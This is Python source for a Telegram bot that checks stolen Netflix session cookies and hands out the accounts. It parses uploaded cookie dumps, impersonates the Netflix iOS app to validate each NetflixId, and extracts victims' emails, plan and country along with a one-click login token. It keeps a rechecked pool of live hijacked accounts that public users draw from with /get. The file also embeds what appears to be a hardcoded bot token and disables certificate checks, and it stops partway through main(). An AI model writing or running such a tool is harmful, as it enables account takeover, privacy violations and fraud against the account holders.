import asyncio
import io
import json
import logging
import os
import re
import urllib.parse
import zipfile
from datetime import datetime, timezone
from collections import deque

import httpx
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from urllib3.exceptions import InsecureRequestWarning

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "9221013683:AAGKJGFCsHU6WQhQYgznjNWxxb6u1AvR46Y")
MAX_CONCURRENT = 10
MAX_COOKIES    = 5000
RECHECK_EVERY  = 3600  # re-validate pool every N seconds (1 hour)

# Comma-separated Telegram user IDs that have admin access
# e.g. ADMIN_IDS=123456789,987654321
_raw_admins    = os.environ.get("8560543587", "")
ADMIN_IDS: set[int] = {int(x.strip()) for x in _raw_admins.split(",") if x.strip().isdigit()}

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

ACCOUNT_PARAMS = {
    **QUERY_PARAMS,
    "path": '["account","customer"]',
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS     = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ── Account pool (in-memory) ───────────────────────────────────────────────────
# Each entry: full result dict from check_one, plus "cookie_dict" for recheck
_pool_lock = asyncio.Lock()
_pool: list[dict] = []          # all known accounts
_pool_index = 0                 # round-robin cursor for /get

# ── Admin guard ────────────────────────────────────────────────────────────────

def is_admin(update: Update) -> bool:
    return update.effective_user.id in ADMIN_IDS

async def admin_only(update: Update) -> bool:
    """Returns True if user is admin. Sends denial and returns False otherwise."""
    if is_admin(update):
        return True
    await update.message.reply_text("⛔ Unauthorized.")
    return False

# ── Helpers ────────────────────────────────────────────────────────────────────

def format_expiry(ts) -> str:
    if not isinstance(ts, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


def token_validity_label(expires) -> str:
    if not isinstance(expires, (int, float)):
        return "Unknown"
    delta = int(expires) - int(datetime.now(timezone.utc).timestamp())
    if delta <= 0:
        return "Expired"
    days, rem  = divmod(delta, 86400)
    hours, rem = divmod(rem, 3600)
    minutes    = rem // 60
    if days > 0:
        return f"{days}d {hours}h {minutes}m remaining"
    if hours > 0:
        return f"{hours}h {minutes}m remaining"
    return f"{minutes}m remaining"


def is_expiring_today(ts) -> bool:
    if not isinstance(ts, (int, float)):
        return False
    now   = datetime.now(timezone.utc)
    start = int(now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
    return start <= ts < start + 86400


def _decode_value(v: str) -> str:
    if "%" in v:
        try:
            return urllib.parse.unquote(v)
        except Exception:
            pass
    return v

# ── Cookie parsing ─────────────────────────────────────────────────────────────

def _parse_netscape_line(line: str) -> dict:
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _extract_inline_cookie_string(line: str) -> str | None:
    m = re.search(r'(?:Cookie:\s*)?(NetflixId=.+)', line, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    return None


def extract_cookie_dict(text: str) -> dict:
    out = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        out.update(_parse_netscape_line(line))
        cookie_str = _extract_inline_cookie_string(line)
        if cookie_str:
            for key in COOKIE_KEYS:
                if key in out:
                    continue
                m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", cookie_str)
                if m:
                    out[key] = _decode_value(m.group(1))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for c in data:
            n, v = c.get("name"), c.get("value")
            if n in COOKIE_KEYS and isinstance(v, str):
                out[n] = _decode_value(v)
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    out[k] = _decode_value(v)
        elif isinstance(data.get("cookies"), list):
            for c in data["cookies"]:
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    out[n] = _decode_value(v)

    for key in COOKIE_KEYS:
        if key in out:
            continue
        m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if m:
            out[key] = _decode_value(m.group(1))

    return out


def _split_cookie_blocks(text: str) -> list[str]:
    text = text.strip()
    if not text:
        return []

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        blocks = []
        for item in data:
            if isinstance(item, list):
                blocks.append(json.dumps(item))
            elif isinstance(item, dict):
                if any(k in item for k in COOKIE_KEYS):
                    blocks.append(json.dumps(item))
                elif "name" in item and "value" in item:
                    blocks.append(json.dumps([item]))
        return blocks

    if "📁 Source:" in text or "\r\n---\r\n" in text or "\n---\n" in text:
        chunks = re.split(r'(?=📁 Source:)', text)
        if len(chunks) > 1:
            return [c.strip() for c in chunks if c.strip() and "NetflixId" in c]

    sections = re.split(r"\n{2,}", text)
    if len(sections) > 1:
        return [s.strip() for s in sections if s.strip()]

    return [line.strip() for line in text.splitlines() if line.strip()]


def extract_all_cookies(text: str) -> list[dict]:
    seen, results = set(), []
    for block in _split_cookie_blocks(text):
        cd  = extract_cookie_dict(block)
        nid = cd.get(REQUIRED_COOKIE)
        if nid and nid not in seen:
            seen.add(nid)
            results.append(cd)
    return results[:MAX_COOKIES]


def _read_bytes(data: bytes) -> str:
    for enc in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="replace")


def extract_cookies_from_file(filename: str, data: bytes) -> list[dict]:
    if filename.lower().endswith(".zip"):
        all_cookies, seen = [], set()
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                for member in zf.namelist():
                    mname = member.lower()
                    if mname.endswith((".txt", ".json", ".csv")) and not mname.startswith("__"):
                        text = _read_bytes(zf.read(member))
                        for cd in extract_all_cookies(text):
                            nid = cd.get(REQUIRED_COOKIE)
                            if nid and nid not in seen:
                                seen.add(nid)
                                all_cookies.append(cd)
        except zipfile.BadZipFile:
            pass
        return all_cookies[:MAX_COOKIES]

    return extract_all_cookies(_read_bytes(data))

# ── Netflix API ────────────────────────────────────────────────────────────────

async def fetch_token(nid: str, client: httpx.AsyncClient) -> tuple[str, int | None]:
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    resp    = await client.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=20)
    resp.raise_for_status()
    data    = resp.json()

    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {})
        .get("default") or {}
    )
    token   = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("no token in response")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


async def fetch_account(nid: str, client: httpx.AsyncClient) -> dict:
    empty   = {
        "email": "N/A", "membership": "N/A", "country": "N/A",
        "member_since": "N/A", "num_profiles": "N/A",
        "can_stream": "N/A", "max_streams": "N/A", "subscription_price": "N/A",
    }
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    try:
        resp = await client.get(API_URL, params=ACCOUNT_PARAMS, headers=headers, timeout=20)
        resp.raise_for_status()
        raw  = resp.json()
        acct = ((raw.get("value") or {}).get("account") or {})
        cust = acct.get("customer") or {}
        if isinstance(cust, dict) and "primaryEmail" not in cust:
            cust = cust.get("customer") or cust

        def g(key, fallback="N/A"):
            v = cust.get(key)
            return str(v) if v not in (None, "", {}) else fallback

        streaming = cust.get("currentMembership") or cust.get("membership") or {}
        return {
            "email":              g("primaryEmail"),
            "membership":         g("membershipStatus"),
            "country":            g("countryOfSignup"),
            "member_since":       g("memberSince"),
            "num_profiles":       g("numProfiles"),
            "can_stream":         g("canStream"),
            "max_streams":        str(streaming.get("maxStreams", "N/A")),
            "subscription_price": str(streaming.get("billingMonthlyTotalPrice", "N/A")),
        }
    except Exception:
        return empty


async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.Semaphore) -> dict:
    nid = cookie_dict.get(REQUIRED_COOKIE, "?")
    async with sem:
        try:
            token, expires = await fetch_token(nid, client)
            account        = await fetch_account(nid, client)
            return {
                "status":         "live",
                "netflix_id":     nid,
                "token":          token,
                "expires":        expires,
                "expiring_today": is_expiring_today(expires),
                "cookie_dict":    cookie_dict,
                **account,
                "error":          None,
            }
        except httpx.HTTPStatusError as e:
            code   = e.response.status_code
            status = "dead" if code in (401, 403) else "error"
            return {
                "status": status, "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False, "cookie_dict": cookie_dict,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": f"HTTP {code}",
            }
        except Exception as e:
            return {
                "status": "error", "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False, "cookie_dict": cookie_dict,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": str(e)[:120],
            }

# ── Pool management ────────────────────────────────────────────────────────────

async def pool_add_results(results: list[dict]):
    """Merge new check results into the pool, deduplicating by NetflixId."""
    global _pool
    async with _pool_lock:
        existing = {r["netflix_id"] for r in _pool}
        for r in results:
            if r["netflix_id"] not in existing:
                _pool.append(r)
                existing.add(r["netflix_id"])
            else:
                # Update existing entry with fresh result
                for i, entry in enumerate(_pool):
                    if entry["netflix_id"] == r["netflix_id"]:
                        _pool[i] = r
                        break


async def pool_recheck():
    """Re-validate every account in the pool. Runs as a background task."""
    global _pool
    while True:
        await asyncio.sleep(RECHECK_EVERY)
        async with _pool_lock:
            snapshot = list(_pool)

        if not snapshot:
            continue

        log.info(f"Pool recheck: {len(snapshot)} accounts")
        sem = asyncio.Semaphore(MAX_CONCURRENT)
        async with httpx.AsyncClient(verify=False) as client:
            tasks   = [check_one(r["cookie_dict"], client, sem) for r in snapshot]
            updated = await asyncio.gather(*tasks)

        async with _pool_lock:
            nid_map = {r["netflix_id"]: r for r in updated}
            _pool   = [nid_map.get(r["netflix_id"], r) for r in _pool]

        live = sum(1 for r in updated if r["status"] == "live")
        log.info(f"Pool recheck done: {live}/{len(updated)} live")


def pool_live_accounts() -> list[dict]:
    """Return live, non-expired accounts from the pool (no lock — read-only snapshot)."""
    now = int(datetime.now(timezone.utc).timestamp())
    return [
        r for r in _pool
        if r["status"] == "live"
        and isinstance(r.get("expires"), (int, float))
        and r["expires"] > now
    ]


def pool_next_account() -> dict | None:
    """Round-robin pick from live pool."""
    global _pool_index
    live = pool_live_accounts()
    if not live:
        return None
    account     = live[_pool_index % len(live)]
    _pool_index = (_pool_index + 1) % max(len(live), 1)
    return account

# ── Formatters ─────────────────────────────────────────────────────────────────

def account_card(r: dict, index: int | None = None) -> str:
    flag     = "⚠️ Expiring Today" if r["expiring_today"] else "✅ Active"
    validity = token_validity_label(r["expires"])
    header   = "🎬 *Netflix Account*" + (f" #{index}" if index else "") + f" — {flag}"
    return "\n".join([
        header,
        "─" * 32,
        f"📧 *Email*          `{r['email']}`",
        f"💳 *Membership*     `{r['membership']}`",
        f"🌍 *Country*        `{r['country']}`",
        f"📅 *Member Since*   `{r['member_since']}`",
        f"👥 *Profiles*       `{r['num_profiles']}`",
        f"📺 *Can Stream*     `{r['can_stream']}`",
        f"🔀 *Max Streams*    `{r['max_streams']}`",
        f"💰 *Sub Price*      `{r['subscription_price']}`",
        "─" * 32,
        f"⏰ *Token Expires*  `{format_expiry(r['expires'])}`",
        f"⌛ *Link Valid For* `{validity}`",
        f"🔗 *Login URL*",
        f"`https://netflix.com/?nftoken={r['token']}`",
    ])


def build_output(results: list[dict]) -> str:
    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead          = [r for r in results if r["status"] == "dead"]
    error         = [r for r in results if r["status"] == "error"]

    ts  = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    sep = "=" * 64
    L   = [
        f"Netflix Checker — {ts}",
        f"Total: {len(results)}  Live: {len(live)}  "
        f"Safe: {len(live_safe)}  Expiring Today: {len(live_expiring)}  "
        f"Dead: {len(dead)}  Error: {len(error)}",
        "",
    ]

    def add_block(r):
        L.extend([
            f"Email          : {r['email']}",
            f"Membership     : {r['membership']}",
            f"Country        : {r['country']}",
            f"Member Since   : {r['member_since']}",
            f"Profiles       : {r['num_profiles']}",
            f"Can Stream     : {r['can_stream']}",
            f"Max Streams    : {r['max_streams']}",
            f"Sub Price      : {r['subscription_price']}",
            f"Token Expires  : {format_expiry(r['expires'])}",
            f"Link Valid For : {token_validity_label(r['expires'])}",
            f"Login URL      : https://netflix.com/?nftoken={r['token']}",
            f"NetflixId      : {r['netflix_id']}",
            "",
        ])

    L += [sep, "LIVE — NOT EXPIRING TODAY", sep]
    for r in live_safe:
        add_block(r)

    if live_expiring:
        L += [sep, "LIVE — EXPIRING TODAY", sep]
        for r in live_expiring:
            add_block(r)

    L += [sep, "DEAD", sep]
    for r in dead:
        L.append(r["netflix_id"])
    L.append("")

    L += [sep, "ERRORS", sep]
    for r in error:
        L.append(f"{r['netflix_id']}  —  {r['error']}")
    L.append("")

    return "\n".join(L)

# ── Progress tracker ───────────────────────────────────────────────────────────

class ProgressReporter:
    def __init__(self, message, total: int):
        self.message    = message
        self.total      = total
        self.done       = 0
        self.live       = 0
        self._lock      = asyncio.Lock()
        self._last_edit = 0.0

    async def tick(self, result: dict):
        async with self._lock:
            self.done += 1
            if result.get("status") == "live":
                self.live += 1
            now = asyncio.get_event_loop().time()
            if now - self._last_edit >= 3.0 or self.done == self.total:
                pct = int(self.done / self.total * 100)
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                try:
                    await self.message.edit_text(
                        f"⏳ Checking…\n"
                        f"[{bar}] {pct}%\n"
                        f"{self.done}/{self.total}  —  ✅ {self.live} live"
                    )
                    self._last_edit = now
                except Exception:
                    pass

# ── Keyboards ──────────────────────────────────────────────────────────────────

def public_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🎬 Get Account", callback_data="pub:get"),
        InlineKeyboardButton("ℹ️ Help",        callback_data="pub:help"),
    ]])


def admin_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📤 Upload & Check", callback_data="adm:upload_hint"),
            InlineKeyboardButton("🗂 Pool Stats",     callback_data="adm:pool"),
        ],
        [
            InlineKeyboardButton("🔄 Recheck Now",   callback_data="adm:recheck"),
            InlineKeyboardButton("🗑 Clear Pool",     callback_data="adm:clear"),
        ],
        [
            InlineKeyboardButton("📥 Export Pool",   callback_data="adm:export"),
            InlineKeyboardButton("👥 Admins",        callback_data="adm:admins"),
        ],
    ])


def back_kb(target: str = "pub") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔙 Back", callback_data=f"{target}:back"),
    ]])

# ── Shared check-and-store helper ──────────────────────────────────────────────

async def run_bulk_check(
    cookies: list[dict],
    status_msg,
    reply_target,
    store_in_pool: bool = False,
) -> list[dict]:
    sem      = asyncio.Semaphore(MAX_CONCURRENT)
    reporter = ProgressReporter(status_msg, len(cookies))

    async with httpx.AsyncClient(verify=False) as client:
        tasks   = [check_one(cd, client, sem) for cd in cookies]
        results = []
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            await reporter.tick(r)

    results.sort(key=lambda r: (
        {"live": 0, "dead": 1, "error": 2}[r["status"]],
        1 if r.get("expiring_today") else 0,
    ))

    if store_in_pool:
        await pool_add_results([r for r in results if r["status"] == "live"])

    return results

# ── Bot handlers — public ──────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_admin(update):
        await update.message.reply_text(
            "🛡 *Admin Dashboard*\n\n"
            "Upload a cookie file to check and store accounts in the pool.\n"
            "Public users can generate login links from the pool via /get.",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb(),
        )
    else:
        await update.message.reply_text(
            "🎬 *Netflix Access*\n\n"
            "Use /get to receive a login link for an active Netflix account.",
            parse_mode="Markdown",
            reply_markup=public_menu_kb(),
        )


async def cmd_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    account = pool_next_account()
    if not account:
        await update.message.reply_text(
            "😔 No active accounts available right now. Try again later."
        )
        return

    login_url = f"https://netflix.com/?nftoken={account['token']}"
    validity  = token_validity_label(account["expires"])

    await update.message.reply_text(
        f"🎬 *Netflix Account Ready*\n\n"
        f"💳 Plan      : `{account['membership']}`\n"
        f"🌍 Country   : `{account['country']}`\n"
        f"⌛ Valid For : `{validity}`\n\n"
        f"👉 [Login]({login_url})",
        parse_mode="Markdown",
        disable_web_page_preview=True,
    )


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update):
        return
    live  = len(pool_live_accounts())
    total = len(_pool)
    await update.message.reply_text(
        f"🛡 *Admin Dashboard*\n\n"
        f"Pool: `{live}` live / `{total}` total\n"
        f"Recheck interval: every `{RECHECK_EVERY // 60}` min",
        parse_mode="Markdown",
        reply_markup=admin_menu_kb(),
    )


async def cmd_pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update):
        return
    live     = pool_live_accounts()
    total    = len(_pool)
    expiring = [r for r in live if r["expiring_today"]]
    safe     = [r for r in live if not r["expiring_today"]]
    dead     = [r for r in _pool if r["status"] == "dead"]

    await update.message.reply_text(
        f"🗂 *Pool Status*\n\n"
        f"Total stored     : `{total}`\n"
        f"✅ Live safe      : `{len(safe)}`\n"
        f"⚠️ Expiring today : `{len(expiring)}`\n"
        f"❌ Dead           : `{len(dead)}`",
        parse_mode="Markdown",
        reply_markup=back_kb("adm"),
    )


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update):
        return
    global _pool, _pool_index
    async with _pool_lock:
        count       = len(_pool)
        _pool       = []
        _pool_index = 0
    await update.message.reply_text(
        f"🗑 Pool cleared. `{count}` entries removed.",
        parse_mode="Markdown",
    )

# ── Bot handlers — document ────────────────────────────────────────────────────

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc      = update.message.document
    filename = doc.file_name or "cookies.txt"

    status_msg = await update.message.reply_text("📥 Downloading…")

    buf = io.BytesIO()
    tg_file = await context.bot.get_file(doc.file_id)
    await tg_file.download_to_memory(buf)

    cookies = extract_cookies_from_file(filename, buf.getvalue())
    if not cookies:
        await status_msg.edit_text(
            "❌ No valid cookies found.\n"
            "File must contain `NetflixId=` entries.",
        )
        return

    store = is_admin(update)
    label = "Admin upload" if store else "Check"
    await status_msg.edit_text(
        f"🔍 {label}: {len(cookies)} cookies found. Checking…"
    )

    results = await run_bulk_check(cookies, status_msg, update.message, store_in_pool=store)

    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead_count    = sum(1 for r in results if r["status"] == "dead")
    error_count   = sum(1 for r in results if r["status"] == "error")

    first = next((r for r in live if not r["expiring_today"]), live[0] if live else None)
    if first:
        await update.message.reply_text(account_card(first), parse_mode="Markdown")

    pool_note = f"\n\n✅ `{len(live)}` accounts added to pool." if store else ""
    await status_msg.edit_text(
        f"📊 *Done*{pool_note}\n\n"
        f"Total          : `{len(results)}`\n"
        f"✅ Live         : `{len(live)}`\n"
        f"   ↳ Safe       : `{len(live_safe)}`\n"
        f"   ↳ Exp. Today : `{len(live_expiring)}`\n"
        f"❌ Dead         : `{dead_count}`\n"
        f"⚠️ Error        : `{error_count}`",
        parse_mode="Markdown",
        reply_markup=admin_menu_kb() if store else None,
    )

    out_buf      = io.BytesIO(build_output(results).encode("utf-8"))
    out_buf.name = f"results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
    await update.message.reply_document(
        document=out_buf,
        filename=out_buf.name,
        caption="Safe accounts at top · expiring today separated.",
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    if not text:
        return

    cd = extract_cookie_dict(text)
    if not cd.get(REQUIRED_COOKIE):
        await update.message.reply_text(
            "No `NetflixId` found.\nTo check many at once, send a file.",
        )
        return

    msg = await update.message.reply_text("🔍 Checking…")
    sem = asyncio.Semaphore(1)

    async with httpx.AsyncClient(verify=False) as client:
        result = await check_one(cd, client, sem)

    if result["status"] == "live":
        if is_admin(update):
            await pool_add_results([result])
        await msg.edit_text(account_card(result), parse_mode="Markdown")
    elif result["status"] == "dead":
        await msg.edit_text("❌ *Dead* — cookie invalid or expired.", parse_mode="Markdown")
    else:
        await msg.edit_text(f"⚠️ *Error* — `{result['error']}`", parse_mode="Markdown")

# ── Callback handler ───────────────────────────────────────────────────────────

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    data = q.data
    await q.answer()

    if data == "pub:get":
        account = pool_next_account()
        if not account:
            await q.edit_message_text(
                "😔 No active accounts available right now.",
                reply_markup=public_menu_kb(),
            )
            return
        login_url = f"https://netflix.com/?nftoken={account['token']}"
        validity  = token_validity_label(account["expires"])
        await q.edit_message_text(
            f"🎬 *Netflix Account Ready*\n\n"
            f"💳 Plan      : `{account['membership']}`\n"
            f"🌍 Country   : `{account['country']}`\n"
            f"⌛ Valid For : `{validity}`\n\n"
            f"👉 [Login]({login_url})",
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_markup=public_menu_kb(),
        )

    elif data == "pub:help":
        await q.edit_message_text(
            "ℹ️ *Help*\n\n"
            "• /get — receive a login link for an active Netflix account\n"
            "• The link opens Netflix and logs you in directly\n"
            "• Links expire after the shown validity time",
            parse_mode="Markdown",
            reply_markup=back_kb("pub"),
        )

    elif data == "pub:back":
        await q.edit_message_text(
            "🎬 *Netflix Access*\n\nUse /get to receive a login link.",
            parse_mode="Markdown",
            reply_markup=public_menu_kb(),
        )

    elif data == "adm:upload_hint":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        await q.edit_message_text(
            "📤 *Upload Cookies*\n\n"
            "Send a `.txt`, `.json`, or `.zip` file.\n"
            "All live accounts will be automatically added to the pool.",
            parse_mode="Markdown",
            reply_markup=back_kb("adm"),
        )

    elif data == "adm:pool":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        live     = pool_live_accounts()
        total    = len(_pool)
        expiring = [r for r in live if r["expiring_today"]]
        safe     = [r for r in live if not r["expiring_today"]]
        dead     = [r for r in _pool if r["status"] == "dead"]
        await q.edit_message_text(
            f"🗂 *Pool Status*\n\n"
            f"Total stored     : `{total}`\n"
            f"✅ Live safe      : `{len(safe)}`\n"
            f"⚠️ Expiring today : `{len(expiring)}`\n"
            f"❌ Dead           : `{len(dead)}`\n\n"
            f"Next recheck in  : `{RECHECK_EVERY // 60}` min",
            parse_mode="Markdown",
            reply_markup=back_kb("adm"),
        )

    elif data == "adm:recheck":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        async with _pool_lock:
            snapshot = list(_pool)
        if not snapshot:
            await q.answer("Pool is empty.", show_alert=True)
            return
        await q.edit_message_text(
            f"🔄 Rechecking `{len(snapshot)}` accounts…",
            parse_mode="Markdown",
        )
        sem = asyncio.Semaphore(MAX_CONCURRENT)
        async with httpx.AsyncClient(verify=False) as client:
            tasks   = [check_one(r["cookie_dict"], client, sem) for r in snapshot]
            updated = await asyncio.gather(*tasks)

        async with _pool_lock:
            nid_map  = {r["netflix_id"]: r for r in updated}
            _pool[:] = [nid_map.get(r["netflix_id"], r) for r in _pool]

        live = sum(1 for r in updated if r["status"] == "live")
        await q.edit_message_text(
            f"✅ *Recheck done*\n\n"
            f"Live : `{live}` / `{len(updated)}`",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb(),
        )

    elif data == "adm:clear":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        global _pool, _pool_index
        async with _pool_lock:
            count       = len(_pool)
            _pool       = []
            _pool_index = 0
        await q.edit_message_text(
            f"🗑 Pool cleared. `{count}` entries removed.",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb(),
        )

    elif data == "adm:export":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        live = pool_live_accounts()
        if not live:
            await q.answer("No live accounts in pool.", show_alert=True)
            return
        out_buf      = io.BytesIO(build_output(live).encode("utf-8"))
        out_buf.name = f"pool_export_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
        await q.message.reply_document(
            document=out_buf,
            filename=out_buf.name,
            caption=f"Pool export — {len(live)} live accounts.",
        )
        await q.edit_message_text(
            f"📥 Exported `{len(live)}` live accounts.",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb(),
        )

    elif data == "adm:admins":
        if not is_admin(update):
            await q.answer("⛔ Unauthorized", show_alert=True)
            return
        ids_str = "\n".join(f"• `{uid}`" for uid in sorted(ADMIN_IDS)) or "None configured"
        await q.edit_message_text(
            f"👥 *Authorized Admins*\n\n{ids_str}\n\n"
            f"Add IDs via `ADMIN_IDS` env var (comma-separated).",
            parse_mode="Markdown",
            reply_markup=back_kb("adm"),
        )

    elif data == "adm:back":
        if not is_admin(update):
            return
        live  = len(pool_live_accounts())
        total = len(_pool)
        await q.edit_message_text(
            f"🛡 *Admin Dashboard*\n\n"
            f"Pool: `{live}` live / `{total}` total",
            parse_mode="Markdown",
            reply_markup=admin_menu_kb(),
        )

# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    loop = asyncio.get_event_loop()
    loop.create_task(pool_recheck())

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("get",   cmd_get))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("pool",  cmd_pool))
    app.add_handler(CommandHandler("clear", cmd_clear))
